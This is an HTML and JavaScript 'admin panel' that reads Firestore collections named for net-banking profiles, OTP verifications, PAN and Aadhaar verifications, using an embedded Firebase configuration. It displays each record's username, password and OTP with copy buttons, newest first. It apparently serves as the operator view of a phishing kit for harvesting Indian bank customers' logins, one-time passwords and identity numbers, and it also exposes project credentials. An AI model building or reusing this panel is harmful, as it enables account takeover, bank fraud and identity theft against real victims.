<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Admin Panel - Mobile Friendly</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 1rem;
      margin: 0;
      background: #f5f5f5;
      color: #000;
    }
    .top-bar {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 1rem;
    }
    .top-bar button {
      padding: 8px 14px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      background: #333;
      color: white;
      font-weight: bold;
      flex-grow: 1;
      flex-shrink: 0;
    }
    h2 {
      margin-top: 1.5rem;
      border-bottom: 2px solid #ccc;
      padding-bottom: 5px;
      color: red;
      font-size: 1.2rem;
    }
    .entry {
      background: #ffffff;
      margin-bottom: 10px;
      padding: 10px;
      border-radius: 6px;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }
    .field {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 6px;
      flex-wrap: wrap;
    }
    .label {
      font-weight: bold;
      max-width: 70%;
    }
    .timestamp {
      font-size: 0.8rem;
      color: red;
      margin-top: 3px;
    }
    .copy-btn {
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 4px 8px;
      cursor: pointer;
      white-space: nowrap;
      margin-top: 5px;
    }
    .section {
      display: none;
    }
    @media (max-width: 600px) {
      .field {
        flex-direction: column;
        align-items: flex-start;
      }
      .label {
        max-width: 100%;
        margin-bottom: 4px;
      }
    }
  </style>
</head>
<body>
  <div class="top-bar" id="collectionButtons"></div>
  <div id="dataContainer"></div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getFirestore, collection, getDocs, query } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
      authDomain: "sbighsh.firebaseapp.com",
      projectId: "sbighsh",
      storageBucket: "sbighsh.appspot.com",
      messagingSenderId: "685947657107",
      appId: "1:685947657107:web:471a0557bb72235272a666"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const collections = ["netbanking_profile", "otp_verifications", "pan_verification", "users", "aadhaar_verifications"];
    const container = document.getElementById("dataContainer");
    const buttonsDiv = document.getElementById("collectionButtons");
    let allEntries = {};

    function createField(key, value) {
      const field = document.createElement("div");
      field.className = "field";

      const label = document.createElement("div");
      label.className = "label";
      label.textContent = `${key}: ${value}`;

      const btn = document.createElement("button");
      btn.className = "copy-btn";
      btn.textContent = "Copy";
      btn.onclick = () => {
        navigator.clipboard.writeText(value);
        btn.textContent = "Copied!";
        setTimeout(() => btn.textContent = "Copy", 1500);
      };

      field.appendChild(label);
      field.appendChild(btn);
      return field;
    }

    function createEntry(entry) {
      const div = document.createElement("div");
      div.className = "entry";

      const displayOrder = ["username", "password", "otp", "profile", "name"];
      displayOrder.forEach(key => {
        if (entry.data[key]) {
          const field = createField(key.charAt(0).toUpperCase() + key.slice(1), entry.data[key]);
          div.appendChild(field);
        }
      });

      for (const key in entry.data) {
        if (displayOrder.includes(key) || (typeof entry.data[key] === "object" && entry.data[key]?.seconds)) continue;
        const field = createField(key, entry.data[key]);
        div.appendChild(field);
      }

      if (entry.data.timestamp?.seconds) {
        const time = new Date(entry.data.timestamp.seconds * 1000).toLocaleString();
        const timeDiv = document.createElement("div");
        timeDiv.className = "timestamp";
        timeDiv.textContent = `Time: ${time}`;
        div.appendChild(timeDiv);
      }

      return div;
    }

    async function loadData() {
      for (const col of collections) {
        const q = query(collection(db, col));
        const snap = await getDocs(q);
        allEntries[col] = [];
        snap.forEach(docSnap => {
          allEntries[col].push({
            id: docSnap.id,
            data: docSnap.data(),
            collection: col,
          });
        });
      }
      createButtons();
    }

    function createButtons() {
      const allBtn = document.createElement("button");
      allBtn.textContent = "ALL DATA";
      allBtn.onclick = () => showAllData();
      buttonsDiv.appendChild(allBtn);

      collections.forEach(col => {
        const btn = document.createElement("button");
        btn.textContent = col.replace(/_/g, " ").toUpperCase();
        btn.onclick = () => showCollection(col);
        buttonsDiv.appendChild(btn);
      });
    }

    function showCollection(col) {
      container.innerHTML = "";
      const section = document.createElement("div");
      section.className = "section";
      section.style.display = "block";

      const heading = document.createElement("h2");
      heading.textContent = col.toUpperCase();
      section.appendChild(heading);

      allEntries[col]
        .sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0))
        .forEach(entry => {
          const div = createEntry(entry);
          section.appendChild(div);
        });

      container.appendChild(section);
    }

    function showAllData() {
      container.innerHTML = "";
      const all = Object.values(allEntries).flat();

      const sorted = all.sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0));
      const section = document.createElement("div");
      section.className = "section";
      section.style.display = "block";

      const heading = document.createElement("h2");
      heading.textContent = "ALL DATA (Newest First)";
      section.appendChild(heading);

      sorted.forEach(entry => {
        const div = createEntry(entry);
        section.appendChild(div);
      });

      container.appendChild(section);
    }

    await loadData();
  </script>
</body>
</html>
